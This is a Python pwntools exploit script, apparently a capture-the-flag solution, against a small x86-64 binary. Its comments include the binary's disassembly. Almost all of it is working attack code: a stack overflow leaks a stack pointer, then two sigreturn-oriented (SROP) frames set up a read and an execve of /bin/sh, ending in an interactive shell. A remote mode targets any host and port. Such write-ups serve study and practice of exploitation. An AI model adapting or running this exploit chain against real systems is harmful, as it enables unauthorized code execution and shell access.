#!/usr/bin/env python

from pwn import *
import sys

# 0000000000401000 <_start>:
#   401000:       68 1e 10 40 00          push   0x40101e
#   401005:       bf 00 00 00 00          mov    edi,0x0
#   40100a:       48 89 e6                mov    rsi,rsp
#   40100d:       48 83 ee 08             sub    rsi,0x8
#   401011:       ba 2c 01 00 00          mov    edx,0x12c
#   401016:       b8 00 00 00 00          mov    eax,0x0
#   40101b:       0f 05                   syscall
#   40101d:       c3                      ret

# 000000000040101e <_write>:
#   40101e:       68 3c 10 40 00          push   0x40103c
#   401023:       48 89 e6                mov    rsi,rsp
#   401026:       48 83 ee 08             sub    rsi,0x8
#   40102a:       ba 08 00 00 00          mov    edx,0x8
#   40102f:       b8 01 00 00 00          mov    eax,0x1
#   401034:       bf 01 00 00 00          mov    edi,0x1
#   401039:       0f 05                   syscall

BIN = "./pwn"

def sigreturn_read(read_location):
    """ Build a SIGRETURN SYS_read frame that reads 2000 bytes.  """
    frame = SigreturnFrame()
    frame.rax = constants.SYS_read
    frame.rdi = constants.STDIN_FILENO
    frame.rsi = read_location
    frame.rdx = 2000
    frame.rsp = read_location
    frame.rip = syscall
    return bytes(frame)

def sigreturn_execve(binsh_addr):
    """
    Build a SYS_execve SIGRETURN frame that will execute /bin/sh
    The binsh address in the stack will eventually hold '/bin/sh'
    followed by a pointer to null, followed by a pointer to binsh's
    pointer, in order to satisfy execve's second argument, and array
    of args, hence the +16
    execve(*program, *args{program, null}, null)
    """
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = binsh_addr 
    frame.rsi = binsh_addr + 16
    frame.rdx = 0
    frame.rip = syscall
    return frame


def setup_pipe(gdb_commands):
    if len(sys.argv) < 2:
        log.error("Run mode missing: [debug, local, remote <server> <port>]")

    context.clear(
        arch="amd64",
        terminal=["tmux", "splitw", "-h"]
    )

    opt = sys.argv[1]
    if opt == "debug":
        context.log_level = "debug",
        io = gdb.debug(BIN, gdb_commands)
    elif opt == "remote" and len(sys.argv) == 4:
        HOST, PORT = sys.argv[2], sys.argv[3]
        io = remote(HOST, PORT)
    elif opt == "local":
        io = process(BIN)
    else:
        log.error("Run mode missing: [debug, local, remote <server> <port>]")

    log.info("Run mode: {}".format(opt))
    return io

if __name__ == "__main__":

    commands = """
    b _start
    """

    elf = ELF(BIN)
    io  = setup_pipe(commands)

    syscall   = elf.sym._start + 27 # 0x401016
    ret2read  = elf.sym._start + 22 # 0x401016
    ret2write = elf.sym._write + 17 # 0x40102f
    _start    = elf.sym._start + 5  # we want to skip pushing _write to the stack

    OFFSET = 8
    SIGRET_FRAME_SIZE = 248
    SLEEP = 1

    io = setup_pipe(commands)

    """
    Overflow the next two return addresses:

    First, ret to (mov eax,0x1) to cause a write syscall. Doing this 
    makes execution skip the part of _write that sets the output length
    to just 8. This makes it print the 0x12c bytes set at 401011, 
    causing pointer leaks

    Next, ret to _start+5 to skip pushing _write at 0x401000. This also
    sets up the binary to begin listening again with an 8 byte buffer,
    putting it back into an overflowable/vulnerable state.
    """
    log.info("Sending initial payload to leak pointers")
    data = b"A" * OFFSET
    data += p64(ret2write) # Leak pointers
    data += p64(_start)    # restart
    io.send(data)


    """
    The 4th giant-word is an environment variable pointer.
    '&' it with 0xfffffffffffff000 to find the memory page start
    """
    leaks = io.recv()
    pointer = leaks[3*8:4*8]
    stack_leak = u64(pointer) & 0xfffffffffffff000
    log.warn('leaked stack: ' + hex(stack_leak))


    """
    Overflow again via the SYS_read we setup from the 1st payload

    First, reset binary to into a read state.  To this read, we will
    soon pass 15 bytes to manipulate RAX 
    (read return value of # bytes read)

    Next, ret to a syscall to trigger the SIGRETURN
    Also, send the SIGRETURN Frame 
    """
    log.info("Sending stage 2 which feeds the first SIGRETURN frame")
    pause(SLEEP)
    data = b"A" * OFFSET
    data += p64(ret2read)
    data += p64(syscall)
    data += sigreturn_read(stack_leak)
    io.send(data)


    """
    Trigger SIGRETURN by sending 15 bytes to the binary when it's
    reading, which sets RAX to 15. When execution meets a syscall
    instruction, the frame above will replace all the register values
    """
    log.info("Triggering the first SIGRETURN by sending 15 junk bytes")
    pause(SLEEP)
    io.send(b'B' * constants.SYS_rt_sigreturn)


    """
    Given our now known stack-base, we can now build out our own stack and 
    track our own offsets. We'll set up another SYS_read which will read 
    15 bytes to set RAX and then ret to a syscall to trigger the SIGRETURN.
    We can calculate where the end of the payload (previous 2 
    instuction plus our custom stack frame) will be. Once triggered,
    /bin/sh will be at RSP.
    """
    binsh = b"/bin/sh\x00"

    payload  = p64(ret2read)
    payload += p64(syscall)

    end_of_payload = stack_leak + len(payload) + SIGRET_FRAME_SIZE + len(binsh)

    frame = sigreturn_execve(end_of_payload)
    frame.rsp = end_of_payload
    payload += bytes(frame)
    # ^ 'end_of_payload'
    payload += binsh
    payload += b"\x00" * 8
    payload += p64(end_of_payload)


    """
    Reset to vuln state
    """
    log.info("Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload")
    io.send(p64(ret2read))
    pause(SLEEP)
    io.send(b"A" * OFFSET + payload)


    """
    Send 15 bytes to trigger SIGRETUN again, executing /bin/sh
    """
    log.info("Triggering the last SIGRETURN")
    pause(SLEEP)
    io.send(b'C' * constants.SYS_rt_sigreturn)
    io.interactive()
